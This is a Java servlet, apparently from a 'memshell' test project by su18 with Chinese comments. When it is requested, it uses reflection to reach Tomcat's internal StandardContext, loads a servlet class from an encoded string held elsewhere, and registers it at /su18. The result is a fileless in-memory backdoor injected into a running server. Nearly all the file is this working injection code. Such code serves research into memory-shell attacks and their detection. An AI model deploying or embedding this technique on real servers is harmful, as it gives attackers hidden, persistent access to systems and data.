package org.su18.memshell.test.tomcat;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

import static org.su18.memshell.test.tomcat.DynamicUtils.SERVLET_CLASS_STRING;


/**
 * 访问这个 Servlet 将会动态添加自定义 Servlet
 * 测试版本 Tomcat 8.5.31
 *
 * @author su18
 */
public class AddTomcatServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {

			String servletName = "su18Servlet";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 servletName 的 Servlet，则不再重复添加
			if (servletContext.getServletRegistration(servletName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					if (object instanceof ServletContext) {
						servletContext = (ServletContext) object;
					} else if (object instanceof StandardContext) {
						o = (StandardContext) object;
					}
				}

				// 创建自定义 Servlet
				Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);

				// 使用 Wrapper 封装 Servlet
				Wrapper wrapper = o.createWrapper();
				wrapper.setName(servletName);
				wrapper.setLoadOnStartup(1);
				wrapper.setServlet((Servlet) servletClass.newInstance());
				wrapper.setServletClass(servletClass.getName());

				// 向 children 中添加 wrapper
				o.addChild(wrapper);

				// 添加 servletMappings
				o.addServletMapping("/su18", servletName);

				PrintWriter writer = resp.getWriter();
				writer.println("tomcat servlet added");

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
